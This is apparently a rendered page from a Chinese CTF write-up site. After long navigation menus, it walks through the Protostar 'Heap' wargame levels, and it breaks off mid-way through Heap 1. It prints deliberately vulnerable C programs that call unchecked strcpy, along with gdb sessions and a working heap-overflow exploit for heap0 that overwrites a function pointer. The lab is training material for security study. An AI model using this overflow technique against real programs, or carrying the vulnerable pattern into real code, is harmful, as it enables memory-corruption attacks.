+      <a href="../../../crypto/fanfie/" class="md-nav__link">
+        fanfie
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/jefferson_disk/" class="md-nav__link">
+        转轮机加密
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/code_modulate/" class="md-nav__link">
+        编码与调制
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/ciscn_rsa/" class="md-nav__link">
+        CISCN - rsa
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/opisthocomus_hoazin/" class="md-nav__link">
+        opisthocomus-hoazin
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/stars_and_shapes/" class="md-nav__link">
+        Stars and Shapes
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/he_thrusts_his_fists_against_the_post/" class="md-nav__link">
+        He Thrusts His Fists Against the Post
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_13" type="checkbox" id="__nav_6_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_13">
+          PBCTF 2021
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="PBCTF 2021" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_13">
+          <span class="md-nav__icon md-icon"></span>
+          PBCTF 2021
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/alkaloid_stream/" class="md-nav__link">
+        Alkaloid Stream
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/steroid_stream/" class="md-nav__link">
+        Steroid Stream
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/easyxor/" class="md-nav__link">
+        easyxor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/ustc_easy_rsa/" class="md-nav__link">
+        HackerGame - Easy RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/baby_mac/" class="md-nav__link">
+        Baby MAC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/noteasy03/" class="md-nav__link">
+        noteasy03
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/dealymaffs/" class="md-nav__link">
+        Dealymaffs
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/weird_programmer/" class="md-nav__link">
+        Weird Programmer
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/x_factor/" class="md-nav__link">
+        X Factor
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/paiaiai/" class="md-nav__link">
+        P(ai)^3
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/casino/" class="md-nav__link">
+        Casino
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/black_hole/" class="md-nav__link">
+        Black Hole
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/diophantine/" class="md-nav__link">
+        Diophantine
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_25" type="checkbox" id="__nav_6_25" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_25">
+          Google CTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Google CTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_25">
+          <span class="md-nav__icon md-icon"></span>
+          Google CTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/cycling/" class="md-nav__link">
+        Cycling
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/maybe_someday/" class="md-nav__link">
+        Maybe Someday
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/dynamic_rsa/" class="md-nav__link">
+        Dynamic RSA
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_27" type="checkbox" id="__nav_6_27" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6_27">
+          corCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="corCTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_6_27">
+          <span class="md-nav__icon md-icon"></span>
+          corCTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/exchanged/" class="md-nav__link">
+        exchanged
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../crypto/leapfrog/" class="md-nav__link">
+        leapfrog
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          Blockchain
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Blockchain" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          Blockchain
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/code_is_law/" class="md-nav__link">
+        Code is Law
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/totally_secure_dapp/" class="md-nav__link">
+        Totally Secure Dapp
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/cairo_reverse/" class="md-nav__link">
+        Cairo Reverse
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/tctf_nft_market/" class="md-nav__link">
+        TCTF NFT Market
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_5" type="checkbox" id="__nav_7_5" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7_5">
+          DownUnderCTF 2022
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DownUnderCTF 2022" data-md-level="2">
+        <label class="md-nav__title" for="__nav_7_5">
+          <span class="md-nav__icon md-icon"></span>
+          DownUnderCTF 2022
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/secret_and_ephemeral/" class="md-nav__link">
+        Secret and Ephemeral
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../blockchain/private_log/" class="md-nav__link">
+        Private Log
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Wargames
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Wargames" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Wargames
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../natas/" class="md-nav__link">
+        Natas
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../leviathan/" class="md-nav__link">
+        Leviathan
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../krypton/" class="md-nav__link">
+        Krypton
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../narnia/" class="md-nav__link">
+        Narnia
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../ethernaut/" class="md-nav__link">
+        Ethernaut
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_6" type="checkbox" id="__nav_8_6" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8_6">
+          Protostar
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Protostar" data-md-level="2">
+        <label class="md-nav__title" for="__nav_8_6">
+          <span class="md-nav__icon md-icon"></span>
+          Protostar
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../stack/" class="md-nav__link">
+        Stack
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../format/" class="md-nav__link">
+        Format
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Heap
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Heap
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#heap-0" class="md-nav__link">
+    Heap 0
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#heap-1" class="md-nav__link">
+    Heap 1
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional" class="md-nav__link">
+    Additional
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#heap-2" class="md-nav__link">
+    Heap 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#heap-3" class="md-nav__link">
+    Heap 3
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_3" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../net/" class="md-nav__link">
+        Net
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../final/" class="md-nav__link">
+        Final
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          彩蛋
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="彩蛋" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          彩蛋
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_index/" class="md-nav__link">
+        CTFHub - 首页
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_wechat/" class="md-nav__link">
+        CTFHub - 公众号
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_tools/" class="md-nav__link">
+        CTFHub - 工具
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_match/" class="md-nav__link">
+        CTFHub - 赛事
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../eggs/ctfhub_exams/" class="md-nav__link">
+        CTFHub - 真题
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#heap-0" class="md-nav__link">
+    Heap 0
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 0">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#heap-1" class="md-nav__link">
+    Heap 1
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 1">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_1" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#additional" class="md-nav__link">
+    Additional
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#heap-2" class="md-nav__link">
+    Heap 2
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 2">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_2" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#heap-3" class="md-nav__link">
+    Heap 3
+  </a>
+  
+    <nav class="md-nav" aria-label="Heap 3">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_3" class="md-nav__link">
+    Exploit
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+  
+
+  
+                
+  <a href="https://github.com/YanhuiJessica/Chictf-Writeups/edit/master/docs/wargames/protostar/heap.md" title="编辑此页" class="md-content__button md-icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20.71 7.04c.39-.39.39-1.04 0-1.41l-2.34-2.34c-.37-.39-1.02-.39-1.41 0l-1.84 1.83 3.75 3.75M3 17.25V21h3.75L17.81 9.93l-3.75-3.75L3 17.25Z"/></svg>
+  </a>
+
+
+
+  <h1>Heap</h1>
+
+<blockquote>
+<p>The levels to be exploited can be found in the /opt/protostar/bin directory.</p>
+</blockquote>
+<h2 id="heap-0">Heap 0<a class="headerlink" href="#heap-0" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)();</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;level passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">nowinner</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;level has not been passed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="w"> </span><span class="o">*</span><span class="n">d</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="w"> </span><span class="o">*</span><span class="n">f</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">data</span><span class="p">));</span><span class="w">  </span><span class="c1">// 64 bytes</span>
+<span class="w">  </span><span class="n">f</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">fp</span><span class="p">));</span><span class="w">    </span><span class="c1">// 4 bytes</span>
+<span class="w">  </span><span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">nowinner</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;data is at %p, fp is at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">d</span><span class="p">,</span><span class="w"> </span><span class="n">f</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">d</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">f</span><span class="o">-&gt;</span><span class="n">fp</span><span class="p">();</span><span class="w"></span>
+
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>需要修改 <code>f-&gt;fp</code> 的值，使其指向 <code>winner</code> 函数</li>
+<li>
+<p>查看 <code>d-&gt;name</code> 溢出后对 <code>f-&gt;fp</code> 的影响</p>
+<div class="highlight"><pre><span></span><code><span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x41</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">*</span> <span class="mi">4</span>
+<span class="nb">print</span> <span class="n">s</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>$ gdb ./heap0
+<span class="o">(</span>gdb<span class="o">)</span> r <span class="sb">`</span>python /tmp/heap.py<span class="sb">`</span>
+
+Starting program: /opt/protostar/bin/heap0 <span class="sb">`</span>python /tmp/heap.py<span class="sb">`</span>
+data is at 0x804a008, fp is at 0x804a050
+
+Program received signal SIGSEGV, Segmentation fault.
+0x53535353 <span class="k">in</span> ?? <span class="o">()</span> <span class="c1"># S</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>winner</code> 函数的地址</p>
+<div class="highlight"><pre><span></span><code><span class="o">(</span>gdb<span class="o">)</span> x winner 
+0x8048464 &lt;winner&gt;: 0x83e58955
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code>$ ./heap0 <span class="k">$(</span>python -c <span class="s2">&quot;print &#39;A&#39; * 72 + &#39;\x64\x84\x04\x08&#39;&quot;</span><span class="k">)</span>
+data is at 0x804a008, fp is at 0x804a050
+level passed
+</code></pre></div>
+<h2 id="heap-1">Heap 1<a class="headerlink" href="#heap-1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
+
+<span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="kt">int</span><span class="w"> </span><span class="n">priority</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">;</span><span class="w"></span>
+<span class="p">};</span><span class="w"></span>
+
+<span class="kt">void</span><span class="w"> </span><span class="nf">winner</span><span class="p">()</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and we have a winner @ %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">**</span><span class="n">argv</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="w"> </span><span class="o">*</span><span class="n">i1</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i2</span><span class="p">,</span><span class="w"> </span><span class="o">*</span><span class="n">i3</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">// i1 points to the start of 8 bytes in memory</span>
+<span class="w">  </span><span class="n">i1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="w"> </span><span class="c1">// i1 + 4</span>
+
+<span class="w">  </span><span class="n">i2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">internet</span><span class="p">));</span><span class="w"></span>
+<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">priority</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"></span>
+<span class="w">  </span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i1</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span><span class="w">    </span><span class="c1">// 超过 8 字节将会影响 i2 对应的内存</span>
+<span class="w">  </span><span class="n">strcpy</span><span class="p">(</span><span class="n">i2</span><span class="o">-&gt;</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="w"></span>
+
+<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;and that&#39;s a wrap folks!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+<ul>
+<li>
+<p>查看 <code>i1-&gt;name</code> 溢出对 <code>i2-&gt;name</code> 的影响</p>
+<ul>
+<li>可以改变 <code>i2-&gt;name</code> 的值，从而能通过 <code>strcpy</code> 写入任意地址</li>
+</ul>
+<div class="highlight"><pre><span></span><code>$ gdb ./heap1
+<span class="o">(</span>gdb<span class="o">)</span> r AAAABBBBCCCCDDDDEEEEFFFFGGGG <span class="m">00001111222233334444</span>
